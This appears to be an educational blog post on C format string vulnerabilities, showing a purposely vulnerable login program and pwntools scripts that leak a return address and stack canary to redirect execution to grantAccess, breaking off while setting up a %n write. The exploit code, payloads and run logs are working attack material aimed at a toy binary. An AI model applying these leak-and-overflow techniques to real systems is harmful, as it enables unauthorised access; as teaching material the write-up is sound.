---
title:  "Format String Vulnerability"
date:   2025-12-10
categories: ["reverse engineering"]
tags: ["vulnerabilities","format string", "buffer overflow","reverse engineering"]
author: Sanketh
references:

---

# Format String Vulnerabilities

## Why Information Leaks Matter in Modern Exploitation

### The ASLR Problem

Modern systems use Address Space Layout Randomization (ASLR) to randomize memory locations:

- Stack addresses change every execution
- Heap addresses randomized
- Library (libc) addresses randomized
- Code addresses randomized (with PIE)

**The dilemma:**

- You can overflow a buffer and control the return address (this is again assuming we somehow defeated the canary)
- But you don't know WHERE to point it (shellcode location unknown)
- Even ROP gadget addresses are randomized
- You need to LEAK memory addresses first!

Format string vulnerabilities are one of the most powerful information leak primitives.

## Format Strings in C

Format strings are used by functions like `printf`, `sprintf`, `fprintf` to format output with placeholders. These are not simple string printers. They are mini interpreters.

Example

```c
printf("x = %d, y = %d\n", x, y);
```

Here:
`"x = %d, y = %d\n"` is not data It is a program that tells printf:

1.	Print literal text `x = `
2.	Fetch an integer argument → print it as decimal
3.	Print , `y = `
4.	Fetch another integer argument → print it
5.	Print newline

So: A format string is instructions for how to consume arguments and produce output.

### Common format specifiers

```
| Specifier | Meaning  | How argument is interpreted |
| --------- | -------- | --------------------------- |
| `%d`      | decimal  | `int`                       |
| `%u`      | unsigned | `unsigned int`              |
| `%x`      | hex      | `unsigned int`              |
| `%p`      | pointer  | `void*`                     |
| `%s`      | string   | pointer → dereference       |
| `%c`      | char     | integer → cast              |
| `%f`      | float    | double (promotion rules)    |
| `%n`      | Write count to memory | (no output)    |
```

We can also pass width, precision, and modifiers

```
%08x
%.3f
%10s
%lld
```

These don’t change where data comes from — they change how it’s formatted.


### How printf actually processes arguments?

```
arg_ptr = start_of_arguments;

for each character in format_string:
    if character != '%':
        print(character)
    else:
        specifier = parse_specifier()
        value = *arg_ptr
        arg_ptr++
        print(value according to specifier)
```

We can. see what’s missing:

- No check that `arg_ptr` is valid
- No check that caller provided enough arguments
- No type safety



### Variadic functions: the critical design choice

```c
int printf(const char *fmt, ...);
```

This means:
	•	The compiler does not know how many arguments are passed
	•	Only the format string tells printf how many arguments exist
	•	There is no runtime verification

So `printf` blindly trusts the format string. This is not a bug — it’s how C was designed.

#### Where do the arguments come from?

In 32-bit x86 all arguments of `printf` will be on stack.


**Stack layout:**
```
High addresses
┌─────────────────┐
│ arg3            │
├─────────────────┤
│ arg2            │
├─────────────────┤
│ arg1            │
├─────────────────┤
│ format string   │ ← printf's first argument
├─────────────────┤
│ return address  │
└─────────────────┘
Low addresses
```

64-bit x86-64 (AMD64) - First 6 in Registers. Calling convention (System V AMD64 ABI):

```
- RDI = 1st argument (format string)
- RSI = 2nd argument
- RDX = 3rd argument
- RCX = 4th argument
- R8  = 5th argument
- R9  = 6th argument
- Stack = 7th argument onwards

```

This doesn't change much, it just means it will leak addresses only when there are more than 7 format specifiers and not enough values. 

## The Vulnerability: User Input as Format String

The critical mistake is passing user input as a format string.

```c
char user_input[100];
fgets(user_input, sizeof(user_input), stdin);

// DANGEROUS: User input used directly as format string
printf(user_input);
```

**Why this is dangerous:**

- User controls the format string
- User can inject format specifiers like `%x`, `%s`, `%n`
- These specifiers will read or write memory without authorization
- Can lead to information disclosure or arbitrary code execution

### Sample Program With Vulnerability

```c
#include <stdio.h>
#include <string.h>


void grantAccess() {
	printf("Access Granted\n");
}

void checkPassword(char* password, int *isAuthenticated) {

	if (strcmp(password, "admin123") == 0) {
		*isAuthenticated = 1;
	}
}


void AuthenticateUser() {
	char password[8];
    char username[8];
	int  isAuthenticated = 0;

    printf("Enter Username: ");
	scanf("%s", username);

	printf("Enter password for: ");
    printf(username);
	scanf("%s", password);

	checkPassword(password, &isAuthenticated);

	if (isAuthenticated == 1) {
		grantAccess();
	} else {
		printf("Authentication Failed\n");
	}

}

int main() {
	AuthenticateUser();
}
```

This is a version of the program we previously used in buffer overflows, but this time we will do it without disabling ASLR and without inspecting with GDB. 

```c
    printf(username);
```

This is the line which allows us to exploit format string vulnerability. A safe version would've been

```c
    printf("%s", username);
```

We still need to disable stackguard as our attack is based on buffer overflow

```bash
$ gcc -fno-stack-protector  -O0 -o vuln  main.c
main.c: In function ‘AuthenticateUser’:
main.c:26:17: warning: format not a string literal and no format arguments [-Wformat-security]
   26 |          printf(username);
      |                 ^~~~~~~~
```

We can see gcc shows us warning that we are passing only format string an not arguments. Static analysis can catch format strings vulnerability very effectively. 

Let's look at the assembly of `AuthenticateUser` function to confirm the vulenrability 

```bash
$ objdump -d -M intel,mnemonic,no-att -j .text vuln

00000000000011fe <AuthenticateUser>:
    11fe:	f3 0f 1e fa          	endbr64
    1202:	55                   	push   rbp
    1203:	48 89 e5             	mov    rbp,rsp
    1206:	48 83 ec 20          	sub    rsp,0x20
    120a:	c7 45 ec 00 00 00 00 	mov    DWORD PTR [rbp-0x14],0x0
    1211:	48 8d 05 04 0e 00 00 	lea    rax,[rip+0xe04]        # 201c <_IO_stdin_used+0x1c>
    1218:	48 89 c7             	mov    rdi,rax
    121b:	b8 00 00 00 00       	mov    eax,0x0
    1220:	e8 6b fe ff ff       	call   1090 <printf@plt>
    1225:	48 8d 45 f0          	lea    rax,[rbp-0x10]
    1229:	48 89 c6             	mov    rsi,rax
    122c:	48 8d 05 fa 0d 00 00 	lea    rax,[rip+0xdfa]        # 202d <_IO_stdin_used+0x2d>
    1233:	48 89 c7             	mov    rdi,rax
    1236:	b8 00 00 00 00       	mov    eax,0x0
    123b:	e8 70 fe ff ff       	call   10b0 <__isoc99_scanf@plt>
    1240:	48 8d 05 e9 0d 00 00 	lea    rax,[rip+0xde9]        # 2030 <_IO_stdin_used+0x30>
    1247:	48 89 c7             	mov    rdi,rax
    124a:	b8 00 00 00 00       	mov    eax,0x0
    124f:	e8 3c fe ff ff       	call   1090 <printf@plt>
    1254:	48 8d 45 f0          	lea    rax,[rbp-0x10]
    1258:	48 89 c7             	mov    rdi,rax
    125b:	b8 00 00 00 00       	mov    eax,0x0
    1260:	e8 2b fe ff ff       	call   1090 <printf@plt>
    1265:	48 8d 45 f8          	lea    rax,[rbp-0x8]
    1269:	48 89 c6             	mov    rsi,rax
    126c:	48 8d 05 ba 0d 00 00 	lea    rax,[rip+0xdba]        # 202d <_IO_stdin_used+0x2d>
    1273:	48 89 c7             	mov    rdi,rax
    1276:	b8 00 00 00 00       	mov    eax,0x0
    127b:	e8 30 fe ff ff       	call   10b0 <__isoc99_scanf@plt>
    1280:	48 8d 55 ec          	lea    rdx,[rbp-0x14]
    1284:	48 8d 45 f8          	lea    rax,[rbp-0x8]
    1288:	48 89 d6             	mov    rsi,rdx
    128b:	48 89 c7             	mov    rdi,rax
    128e:	e8 30 ff ff ff       	call   11c3 <checkPassword>
    1293:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
    1296:	83 f8 01             	cmp    eax,0x1
    1299:	75 0c                	jne    12a7 <AuthenticateUser+0xa9>
    129b:	b8 00 00 00 00       	mov    eax,0x0
    12a0:	e8 04 ff ff ff       	call   11a9 <grantAccess>
    12a5:	eb 0f                	jmp    12b6 <AuthenticateUser+0xb8>
    12a7:	48 8d 05 97 0d 00 00 	lea    rax,[rip+0xd97]        # 2045 <_IO_stdin_used+0x45>
    12ae:	48 89 c7             	mov    rdi,rax
    12b1:	e8 ca fd ff ff       	call   1080 <puts@plt>
    12b6:	90                   	nop
    12b7:	c9                   	leave
    12b8:	c3                   	ret
```

We know the calling convention is to place first parameter in `rdi` and second parameter in `rsi`.

We can see in the first two `printf` calls, the value in `rdi` is taken from `.rodata` section. It uses RIP relative addressing here to point to the address of the hardcoded format strings. 

```bash
    122c:	48 8d 05 fa 0d 00 00 	lea    rax,[rip+0xdfa]        # 202d <_IO_stdin_used+0x2d>
    1233:	48 89 c7             	mov    rdi,rax
    1236:	b8 00 00 00 00       	mov    eax,0x0
    123b:	e8 70 fe ff ff       	call   10b0 <__isoc99_scanf@plt>
    1240:	48 8d 05 e9 0d 00 00 	lea    rax,[rip+0xde9]        # 2030 <_IO_stdin_used+0x30>
    1247:	48 89 c7             	mov    rdi,rax
    124a:	b8 00 00 00 00       	mov    eax,0x0
    124f:	e8 3c fe ff ff       	call   1090 <printf@plt>
```

But in the third `printf`

```bash
    1254:	48 8d 45 a0          	lea    rax,[rbp-0x10]
    1258:	48 89 c7             	mov    rdi,rax
    125b:	b8 00 00 00 00       	mov    eax,0x0
    1260:	e8 2b fe ff ff       	call   1090 <printf@plt>
```

We can see the adress written to `rdi` is relative to `rbp` which means its clearly on the stack and its the address of the `username` variable.


### Exploit 1: Leak the Stack Adresses and Replace the Return Address of `AuthenticateUser` to `grantAccess`

Let's visualize the stack layout:

```
1206:	sub    rsp,0x20           # Allocate 32 bytes (0x20)
120a:	mov    DWORD PTR [rbp-0x14],0x0    # isAuthenticated
1225:	lea    rax,[rbp-0x10]              # username
1265:	lea    rax,[rbp-0x8]               # password
```

**Stack layout:**
```
Higher addresses
┌──────────────────────┐
│ Return address       │ ← [rbp+8]  (0x12cb - points to main)
│ (0x55...12cb)        │    **WE WANT TO OVERWRITE THIS!**
├──────────────────────┤
│ Saved RBP            │ ← [rbp]    (8 bytes)
├──────────────────────┤
│ password[8]          │ ← [rbp-0x8]  (8 bytes from RBP)
├──────────────────────┤
│ username[8]          │ ← [rbp-0x10] (16 bytes from RBP)
├──────────────────────┤
│ isAuthenticated (4)  │ ← [rbp-0x14] (20 bytes from RBP)
├──────────────────────┤
│ padding (12 bytes)   │ ← [rbp-0x20] (unused, stack aligned)
└──────────────────────┘
Lower addresses
```

Total stack frame: 32 bytes (0x20)

#### Calculating Key Distances

##### 1. Distance of Password From Saved RA 

This is what we need to leak with format string vulnerability and overwrite it later

- username at `[rbp-0x10]`
- password at `[rbp-0x8]`
- return address at `[rbp+8]`
- Distance from username to return address: `0x10 + 8 = 24 bytes`
- Distance from password to return address: `0x8 + 8 = 16 bytes`

##### 2. The Actual Address of `grantAccess`

This is where we need to jump to using buffer overflow and the previous information leaked. 

Now lets calculate the address of `grantAccess`: Since this is PIE + ASLR enabled binary and we are not using GDB, we need a creative way to find dynamic address of `grantAccess` function. One insight that we can recall is, even with PIE and ASLR enabled, the relative distance between the lines of code in `.text` section remains same. 



```
00000000000012b9 <main>:
    12b9:	f3 0f 1e fa          	endbr64
    12bd:	55                   	push   rbp
    12be:	48 89 e5             	mov    rbp,rsp
    12c1:	b8 00 00 00 00       	mov    eax,0x0
    12c6:	e8 33 ff ff ff       	call   11fe <AuthenticateUser>
    12cb:	b8 00 00 00 00       	mov    eax,0x0 -> this is the return address of AuthenticateUser
    12d0:	5d                   	pop    rbp 
    12d1:	c3                   	ret
```

```
Return address (leaked): 0x12cb
grantAccess:            0x11a9
Offset:                 0x12cb - 0x11a9 = 0x122 (290 bytes)
```

Since we would've already leaked the return address in `main` using format string in our previous step, 
we can add this offset of 290 bytes to get the actual address of `grantAccess`. 

##### 3. Correct Argument to Leak From `printf`

When we call printf:

```
call printf
```

Inside printf's perspective:

```
Position 1-6: RDI, RSI, RDX, RCX, R8, R9 (registers)
Position 7:   [rsp]      ← First stack parameter
Position 8:   [rsp+8]    ← Second stack parameter
Position 9:   [rsp+16]   ← Third stack parameter
Position 10:  [rsp+24]
etc.
```

What the Compiler Generates:

```
# Caller (before call printf):
push arg8          # Push in reverse order
push arg7
mov r9, arg6       # Load registers
mov r8, arg5
mov rcx, arg4
mov rdx, arg3
mov rsi, arg2
mov rdi, arg1
call printf        # Now RSP points right at arg7!

# After printf returns:
add rsp, 16        # Clean up the 2 stack args (arg7, arg8)
```

Since callee is passing the variadic arguments, it will be located on the stack before the `printf`'s stack frame is set up. 

This is the stack frame just before `printf` is about to be called, the callee has pushed the variadic arguments ot stack (in this case its not) and saved the return adddress to callee. The printf's prologue has not been executed yet. Since the variadic argument `va_list` is already present on stack, we can guarantee that `printf`'s `arg_ptr` starts scanning arguments from there and the actual stack frame of `printf` doesn't even matter. 

```
Higher addresses
┌──────────────────────┐
│ Return to main       │  ← AuthenticateUser return addr (TARGET)
├──────────────────────┤
│ Saved RBP            │
├──────────────────────┤
│ password[8]          │
├──────────────────────┤
│ username[8]          │
├──────────────────────┤
│ isAuthenticated +    │
│ padding              │
├──────────────────────┤
│ va_list              │  ← printf's arg_ptr starts, here, it will look like [rbp+8] in printf's assembly
├──────────────────────┤
│ return address to.   |
| AuthenticateUser.    │  ← [rsp] of AuthenticateUser 
└──────────────────────┘
Lower addresses
```

By looking at the [stack](#exploit-1-leak-the-stack-adresses-and-relace-the-return-address-of-authenticateuser-to-grantaccess) we built previously. We can see we ened to move the `printf`'s `arg_ptr` 5 times. So considering 6 register arguments, we get 6 + 5 = 11. So we need to leak the 12th value in what printf thinks is a value to format string. 

We can use `%p` to print the addresses with `0x` prefix. If we add `%p` 11 times, we will leak the 11th argument. 

```bash
sanketh@sanketh-81de:$ ./vuln
Enter Username: %p%p%p%p%p%p%p%p%p%p%p
Enter password for: 0x7ffded20f2c0(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x5d61a35072cb^C
sanketh@sanketh-81de:$ ./vuln
Enter Username: %p%p%p%p%p%p%p%p%p%p%p
Enter password for: 0x7ffeb89c1e40(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x5ce761ba72cb^C
sanketh@sanketh-81de:$ ./vuln
Enter Username: %p%p%p%p%p%p%p%p%p%p%p
Enter password for: 0x7ffe874444d0(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x5ca4fddfe2cb^C
sanketh@sanketh-81de:$ ./vuln
Enter Username: %p%p%p%p%p%p%p%p%p%p%p
Enter password for: 0x7ffd4ef49d80(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x651533b3e2cb^C
```

We can see even with ASLR, our return address consistenly ends with `2cb`. In fact even the static address on binary showed the address ending with `2cb`. 

```
    12cb:	b8 00 00 00 00       	mov    eax,0x0 -> this is the return address of AuthenticateUser
```

The important observation here is, the last 3 nibbles remains unchanged even after ASLR!

Its because of the page alignment
•	Page size = `4096 bytes` = `0x1000`
•	That means the lowest 12 bits are always zero

So the constant offset ASLR will be adding has to be a multiple of `4096` which means last 3 nibbles are always 0. Otherwise it would disturb the page layout of segments. 

We can use this as to double confirm we're headed in the right direction. Or we can also do rough calculation and leak a set of addresses around our estimate and look for the one ending with expected last 12 bits. 

Sometimes we may not have space to tpe enough `%p`'s, the content itself might overflow and end up overwriting the return address which will simply crash the program. There is another we can print any argument with just 8 bytes of input

```bash
Enter Username: %11$p
Enter password for: 0x5a45b5b602cb
```

This will directly take us to the 11th parameter.

#### Building the Payload for Buffer Overflow

Let's consider this execution

```bash
$ ./vuln
Enter Username: %11$p
Enter password for: 0x5a45b5b602cb
```

From our earlier calculation we deduced that the address of `grantAccess` is 290 bytes below the address of return address to main. Using that we can do `0x5a45b5b602cb + 0x122 = 0x0x5a45b5b603ed`

But the problem is we cannot send a raw bytestring as input from `stdin`. Because the ascii representation of some of these bytes are not even printable. So we pass it using script. 

```python
from pwn import *
import re

print("[*] Launching process")
p = process("./vuln", stdin=PTY, stdout=PTY)

print("[*] Waiting for 'Enter Username:'")
data = p.recvuntil(b"Enter Username: ", timeout=2)
print(f"[DEBUG] Received so far:\n{data}")

print("[*] Sending format string")
p.sendline(b"%11$p")

print("[*] Waiting for 'Enter password for:'")
data = p.recvuntil(b"Enter password for: ", timeout=2)
print(f"[DEBUG] Received so far:\n{data}")

print("[*] Attempting to read leaked pointer")
leak_line = p.recv(timeout=2)
print(f"[DEBUG] Raw leak bytes: {leak_line}")

# Try extracting address safely
m = re.search(rb"0x[0-9a-fA-F]+", leak_line)
if not m:
    print("[!] Failed to find leaked address!")
    p.interactive()
    exit(1)

leak = int(m.group(0), 16)
print(f"[+] Leaked return address: {hex(leak)}")

print("[*] Calculating grantAccess")
grant_access = leak - 0x122
print(f"[+] grantAccess = {hex(grant_access)}")

print("[*] Building payload")
payload = b"A"*8 + b"B"*8 + p64(grant_access)
print(f"[DEBUG] Payload length: {len(payload)}")
print(f"[DEBUG] Payload bytes: {payload}")

print("[*] Sending password payload")
p.sendline(payload)

print("[*] Reading remaining output")
out = p.recvall(timeout=1)
print(out.decode(errors="ignore"))
```

```bash
$ python3 pwn_payload3.py
[*] Launching process
[+] Starting local process './vuln' argv=[b'./vuln'] : pid 3536
[*] Waiting for 'Enter Username:'
[DEBUG] Received 0x10 bytes:
    b'Enter Username: '
[DEBUG] Received so far:
b'Enter Username: '
[*] Sending format string
[DEBUG] Sent 0x6 bytes:
    b'%11$p\n'
[*] Waiting for 'Enter password for:'
[DEBUG] Received 0x22 bytes:
    b'Enter password for: 0x55bbc51d72cb'
[DEBUG] Received so far:
b'Enter password for: '
[*] Attempting to read leaked pointer
[DEBUG] Raw leak bytes: b'0x55bbc51d72cb'
[+] Leaked return address: 0x55bbc51d72cb
[*] Calculating grantAccess
[+] grantAccess = 0x55bbc51d71a9
[*] Building payload
[DEBUG] Payload length: 24
[DEBUG] Payload bytes: b'AAAAAAAABBBBBBBB\xa9q\x1d\xc5\xbbU\x00\x00'
[*] Sending password payload
[DEBUG] Sent 0x19 bytes:
    00000000  41 41 41 41  41 41 41 41  42 42 42 42  42 42 42 42  │AAAA│AAAA│BBBB│BBBB│
    00000010  a9 71 1d c5  bb 55 00 00  0a                        │·q··│·U··│·│
    00000019
[*] Reading remaining output
[+] Receiving all data: Done (37B)
[DEBUG] Received 0x25 bytes:
    b'Authentication Failed\n'
    b'Access Granted\n'
[*] Stopped process './vuln' (pid 3536)
Authentication Failed
Access Granted
```

This shows that the exploit worked!

### Exploit 2: Buffer Overflow with Stack Canary Enabled

In our previous exploit we disabled stack canary because the buffer overflow will overwrite canary and the program will crash before we execute the code for `grantAccess`. 

Now we will keep the stack canary enabled and achieve the same result. The key to this attack is we can leak the stack canary in the same way we leaked the return address. Then while building the payload, we will make sure that the value of canary gets overwritten with same value, so the canary check won't fail.

For this example, i will change the length of username to 12 bytes, because we need to pass more than 8 bytes of input without overwriting canary. Even though we've defined `username` after `password`, `username` appears on stack first, meaning closer to canary. Compiler is free to reorder local variables on stack, so we can't rely on it. 

```c
#include <stdio.h>
#include <string.h>


void grantAccess() {
	printf("Access Granted\n");
}

void checkPassword(char* password, int *isAuthenticated) {

	if (strcmp(password, "admin123") == 0) {
		*isAuthenticated = 1;
	}
}


void AuthenticateUser() {
	char password[8];
    char username[12];
	int  isAuthenticated = 0;

    printf("Enter Username: ");
	scanf("%s", username);

	printf("Enter password for: ");
    printf(username);
	scanf("%s", password);

	checkPassword(password, &isAuthenticated);

	if (isAuthenticated == 1) {
		grantAccess();
	} else {
		printf("Authentication Failed\n");
	}

}

int main() {
	AuthenticateUser();
}
```

```bash
$ gcc  -O0 -o vuln_canary  main.c
main.c: In function ‘AuthenticateUser’:
main.c:26:17: warning: format not a string literal and no format arguments [-Wformat-security]
   26 |          printf(username);
      |                 ^~~~~~~~
```

With `-fstack-protector` (or default GCC settings), the stack frame becomes:

```
Higher addresses
┌──────────────────────────┐
│ Saved RBP                │ ← rbp
├──────────────────────────┤
│ Return Address           │ ← rbp+8
├──────────────────────────┤
│ Stack Canary (8 bytes)   │ ← rbp-0x8
├──────────────────────────┤
│ username[12]             │ ← rbp-0x14
├──────────────────────────┤
│ password[8]              │ ← rbp-0x1c
├──────────────────────────┤
│ isAuthenticated (4)      │ ← rbp-0x20
├──────────────────────────┤
│ padding (4 bytes)        │ ← rbp-0x24 (implicit)
└──────────────────────────┘
Lower addresses
```

Since the return address was at `[rsp+40]` earlier, with this intuition it seems like it should be present at `[rsp+48]` because of 8 byte stack canary added in between. But actually, it will still be at `[rsp+40]` because the space used for padding will be compensated. 

We can verify it from GDB

```bash
Breakpoint 1, 0x0000555555555226 in AuthenticateUser ()
(gdb) disass
Dump of assembler code for function AuthenticateUser:
   0x000055555555521e <+0>:	endbr64
   0x0000555555555222 <+4>:	push   rbp
   0x0000555555555223 <+5>:	mov    rbp,rsp
=> 0x0000555555555226 <+8>:	sub    rsp,0x20
   0x000055555555522a <+12>:	mov    rax,QWORD PTR fs:0x28
   0x0000555555555233 <+21>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000555555555237 <+25>:	xor    eax,eax
   0x0000555555555239 <+27>:	mov    DWORD PTR [rbp-0x20],0x0
   0x0000555555555240 <+34>:	lea    rax,[rip+0xdd5]        # 0x55555555601c
   0x0000555555555247 <+41>:	mov    rdi,rax
   0x000055555555524a <+44>:	mov    eax,0x0
```

We can see that the stack size is still 32 bytes from `sub rsp,0x20` which is sill same as earlier. 

But one additional change now is that some lines of code will be added for stack canary as well. So we need to recalculate the offset of `grantAccess`. 


```bash
$ objdump -d -M intel,mnemonic,no-att -j .text vuln_canary

00000000000012fc <main>:
    12fc:	f3 0f 1e fa          	endbr64
    1300:	55                   	push   rbp
    1301:	48 89 e5             	mov    rbp,rsp
    1304:	b8 00 00 00 00       	mov    eax,0x0
    1309:	e8 10 ff ff ff       	call   121e <AuthenticateUser>
    130e:	b8 00 00 00 00       	mov    eax,0x0.  <- return address to main
    1313:	5d                   	pop    rbp
    1314:	c3                   	ret

00000000000011c9 <grantAccess>:
    11c9:	f3 0f 1e fa          	endbr64
    11cd:	55                   	push   rbp
    11ce:	48 89 e5             	mov    rbp,rsp
    11d1:	48 8d 05 2c 0e 00 00 	lea    rax,[rip+0xe2c]        # 2004 <_IO_stdin_used+0x4>
    11d8:	48 89 c7             	mov    rdi,rax
    11db:	e8 b0 fe ff ff       	call   1090 <puts@plt>
    11e0:	90                   	nop
    11e1:	5d                   	pop    rbp
    11e2:	c3                   	ret
```

The return address to main is now `0x130e` and `grantAccess` is at `0x11c9`. So relative offset is `0x130e - 0x11c9 = 0x145` or 325 bytes. 

With the same idea that last 3 nibbles remain same even with ASLR, we need to look for aress ending with `30e` while leaking. 

We can see that stack canary is 16 bytes behind the return address, so it must be at `[rsp+24]`. ANother way to spot stack canary is to look for numbers with last two nibbles as 0's.

#### Why Stack Canary has Last 8 bits set to 0

The stack canary intentionally ends with a zero byte (\x00) to break string-based overflows.

```
0x77111d362d141300
                ^^
               \x00
```

On x86-64 Linux, the stack canary typically looks like:

```
[random 7 bytes][00]
```

**Why the last byte is zero (the real reason)?**

- To stop `strcpy`, `scanf("%s")`, `gets`, etc.
- Cannot copy a zero byte unless explicitly told to.

So if the canary ends with `\x00`:
	•	Any string overflow will stop before overwriting the canary
	•	Or it will overwrite only the first few bytes, not the full value
	•	Result: canary mismatch → __stack_chk_fail

This defeats accidental and naive overwrites.

#### Leaking the Address

Now can leak 9th and 11th argument for canary and return address respectively

```bash
$ ./vuln_canary
Enter Username: %11$p-%9$p
Enter password for: 0x604f9f2ce30e-0x7fb896f70c86ed00
```

#### Overflowing the Buffer

Using this information we can build the buffer in this pattern

```
[ buffer fill up to canary ]
[ exact 8-byte canary ]
[ fake saved RBP (8 bytes, anything) ]
[ new return address (8 bytes) ]
```

Now we can write a python script using pwntools to exploit this

```python
#!/usr/bin/env python3
from pwn import *
import re

context.binary = "./vuln_canary"
context.log_level = "debug"

def main():
    print("[*] Launching process")
    p = process("./vuln_canary", stdin=PTY, stdout=PTY)

    # -------------------------
    # Stage 1: Leak
    # -------------------------
    print("[*] Waiting for 'Enter Username:'")
    data = p.recvuntil(b"Enter Username: ", timeout=2)
    print(f"[DEBUG] Received so far:\n{data}")

    print("[*] Sending format string leak")
    p.sendline(b"%11$p-%9$p")

    print("[*] Reading leak output")
    data = p.recvuntil(b"Enter password for: ", timeout=2)
    data += p.recv(timeout=0.2)   # drain remaining output

    print(f"[DEBUG] Full leak buffer:\n{data}")

    leaks = re.findall(rb"0x[0-9a-fA-F]+", data)
    if len(leaks) < 2:
        print("[!] Failed to extract leaks")
        p.close()
        return

    ret_addr = int(leaks[0], 16)
    canary   = int(leaks[1], 16)

    print(f"[+] Leaked return address: {hex(ret_addr)}")
    print(f"[+] Leaked canary        : {hex(canary)}")

    # -------------------------
    # Stage 2: Calculate target
    # -------------------------
    OFFSET_RET_TO_GRANT = 0x145   # verified earlier
    grant_access = ret_addr - OFFSET_RET_TO_GRANT

    print(f"[+] Calculated grantAccess: {hex(grant_access)}")

    # -------------------------
    # Stage 3: Build payload
    # -------------------------
    payload  = b"A" * 20          # padding up to canary
    payload += p64(canary)        # correct canary
    payload += b"B" * 8           # saved RBP
    payload += p64(grant_access)  # new return address

    print(f"[DEBUG] Payload length: {len(payload)}")
    print(f"[DEBUG] Payload bytes: {payload}")

    # -------------------------
    # Stage 4: Trigger overflow
    # -------------------------
    print("[*] Sending password payload")
    p.sendline(payload)

    # -------------------------
    # Stage 5: Read result
    # -------------------------
    out = p.recvall(timeout=2)
    print("[*] Program output:")
    print(out.decode(errors="ignore"))

    if b"Access Granted" in out:
        print("[+] SUCCESS: Exploit worked")
    else:
        print("[-] FAILURE: Exploit did not work")

    p.close()

if __name__ == "__main__":
    main()
```

```bash
$ python3 pwn_payload_canary2.py
[*] '/home/sanketh/assembly/vuln/buffer_overflow/stack_based_buffer_overflow/format_strings/vuln_canary'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] Launching process
[+] Starting local process './vuln_canary' argv=[b'./vuln_canary'] : pid 3978
[*] Waiting for 'Enter Username:'
[DEBUG] Received 0x10 bytes:
    b'Enter Username: '
[DEBUG] Received so far:
b'Enter Username: '
[*] Sending format string leak
[DEBUG] Sent 0xb bytes:
    b'%11$p-%9$p\n'
[*] Reading leak output
[DEBUG] Received 0x35 bytes:
    b'Enter password for: 0x60f3fb9c530e-0xd3be8511a62f4400'
[DEBUG] Full leak buffer:
b'Enter password for: 0x60f3fb9c530e-0xd3be8511a62f4400'
[+] Leaked return address: 0x60f3fb9c530e
[+] Leaked canary        : 0xd3be8511a62f4400
[+] Calculated grantAccess: 0x60f3fb9c51c9
[DEBUG] Payload length: 44
[DEBUG] Payload bytes: b'AAAAAAAAAAAAAAAAAAAA\x00D/\xa6\x11\x85\xbe\xd3BBBBBBBB\xc9Q\x9c\xfb\xf3`\x00\x00'
[*] Sending password payload
[DEBUG] Sent 0x2d bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  00 44 2f a6  11 85 be d3  42 42 42 42  │AAAA│·D/·│····│BBBB│
    00000020  42 42 42 42  c9 51 9c fb  f3 60 00 00  0a           │BBBB│·Q··│·`··│·│
    0000002d
[+] Receiving all data: Done (37B)
[DEBUG] Received 0x25 bytes:
    b'Authentication Failed\n'
    b'Access Granted\n'
[*] Process './vuln_canary' stopped with exit code -11 (SIGSEGV) (pid 3978)
[*] Program output:
Authentication Failed
Access Granted

[+] SUCCESS: Exploit worked
```


### Exploit 3: Overwriting the isAuthenticate variable using %n

#### What %n actually does?

In printf-family functions:

```c
printf("hello%n", &x);
```

What happens internally
- printf keeps a counter: “how many characters have I printed so far?”
- When it sees %n:
    - It does not print anything
    - It writes that count into the pointer argument

So if "hello" is printed (5 chars): then x will be 5.

**Variants**

| Specifier | Writes              |
| --------- | ------------------- |
| `%n`      | 4 bytes (`int *`)   |
| `%hn`     | 2 bytes (`short *`) |
| `%hhn`    | 1 byte (`char *`)   |
| `%ln`     | 8 bytes (`long *`)  |

**Why %n is dangerous?**

Our vulnerable line:

```c
printf(username);
```

You control:
- the format string
- which arguments printf thinks exist

That means:
- You can read arbitrary stack values (%p, %x)
- You can write to arbitrary addresses (%n)

This is stronger than buffer overflow.

#### Overwriting isAuthenticated variable on Stack

From our earlier stack, `rbp-0x14` → isAuthenticated (int)

So if we can:
	1.	Find the address of isAuthenticated
	2.	Pass it as a fake argument to printf
	3.	Use `%n`

#### How %n arguments work? 

Even though no arguments were passed, printf will:
	•	walk registers
	•	then stack
	•	and use whatever value happens to be there

This is why `%11$p` worked for leaks.

Let's consider this program

```c
#include <stdio.h>
#include <string.h>


void grantAccess() {
	printf("Access Granted\n");
}

void checkOtp(char* otp, int *isAuthenticated) {

	if (strcmp(otp, "X7pA9kQ2") == 0) {
		*isAuthenticated = 1;
	}
}


void AuthenticateUser() {
        
    char username[8];
	char otp[8];

	int isAuthenticated = 0;

    printf("Enter Username: ");
	scanf("%s", username);

	printf("Enter otp for: ");
   	printf(username);
	scanf("%s", otp);
    printf("You entered otp: ");
    printf(otp);

	checkOtp(otp, &isAuthenticated);

	if (isAuthenticated == 1) {
		grantAccess();
	} else {
		printf("Authentication Failed\n");
	}

}

int main() {
	AuthenticateUser();
}
```

It has two vulnerable `printf`'s. Our idea is to leak address of `isAuthenticated` with first one and overwrite `isAuthenticated` using `%n` in second one. 

```bash
$ gcc -O0 -o vuln  main2.c
main2.c: In function ‘AuthenticateUser’:
main2.c:28:16: warning: format not a string literal and no format arguments [-Wformat-security]
   28 |         printf(username);
      |                ^~~~~~~~
main2.c:31:12: warning: format not a string literal and no format arguments [-Wformat-security]
   31 |     printf(otp);
      |            ^~~
```

The stack frame of `AuthenticateUser` looks like this

```
Higher addresses
┌──────────────────────────────────────────┐
│ rbp+8   │ Return address                 │
├──────────────────────────────────────────┤
│ rbp+0   │ Saved RBP                      │
├──────────────────────────────────────────┤
│ rbp-0x8 │ Stack Canary (8 bytes)         │
│         │  ends with 0x00  ← intentional │
├──────────────────────────────────────────┤
│ rbp-0x10│ otp[8]                         │
├──────────────────────────────────────────┤
│ rbp-0x18│ username[8]                    │
├──────────────────────────────────────────┤
│ rbp-0x1c│ isAuthenticated (int, 4 bytes) │
├──────────────────────────────────────────┤
